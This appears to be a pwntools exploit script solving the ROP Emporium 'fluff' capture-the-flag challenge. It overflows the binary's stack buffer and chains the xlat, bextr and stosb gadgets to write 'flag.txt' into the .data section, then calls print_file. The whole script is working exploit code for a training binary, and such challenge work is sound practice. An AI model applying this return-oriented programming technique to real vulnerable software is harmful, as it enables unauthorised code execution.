from pwn import *
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] +argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './fluff'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# Exploit starts here :)

io = start()
payload = cyclic(100)
io.sendlineafter('> ', payload)
io.wait()

core = io.corefile
esp = core.rsp
four_byte_pattern = core.read(esp, 4)

"""
pwndbg> disas questionableGadgets
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx] # when we use this gadget, at this point, rbx should be pointing to a character of flag.txt
   0x0000000000400629 <+1>:	ret    
   0x000000000040062a <+2>:	pop    rdx
   0x000000000040062b <+3>:	pop    rcx
   0x000000000040062c <+4>:	add    rcx,0x3ef2
   0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:	ret    
=> 0x0000000000400639 <+17>:	stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:	ret    
   0x000000000040063b <+19>:	nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
"""

rop = ROP("./fluff")
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
_data = elf.symbols.data_start
pop_rdx_pop_rcx_add_rcx_0x3ef2_bextr_rbx_rcx_rdx_gadget = elf.symbols.questionableGadgets + 2
xlat = elf.symbols.questionableGadgets
stosb = elf.symbols.questionableGadgets + 17
current_rax = int(str(hex(core.rax)[2:]),16)

_file = b"flag.txt"
_char_array = []
for c in _file:
    _char_in_memory = hex(read("fluff").find(c) + elf.address) 
    _char_array.append(_char_in_memory)
    
exploit = b""
for i, c in enumerate(_char_array):
    if i != 0:
        # set to the value of rax which should be the previous character of "flag.txt" in hexadecimal values (e.g. if we are trying to write 'l', then current_rax should be 'f')
        current_rax = _file[i-1]
    rop.raw([pop_rdx_pop_rcx_add_rcx_0x3ef2_bextr_rbx_rcx_rdx_gadget, p64(0x4000), pack(int(c, 16) - current_rax - 0x3ef2, 64), xlat, pop_rdi, _data + i, stosb])
    
rop.print_file(_data)
rop.chain()

payload = fit({
	four_byte_pattern: rop
})

p = process()
p.sendlineafter('>', payload)
p.interactive()

"""
io = start()
io.sendline(payload)
io.recv()

flag = io.recvline()
success(flag)
"""

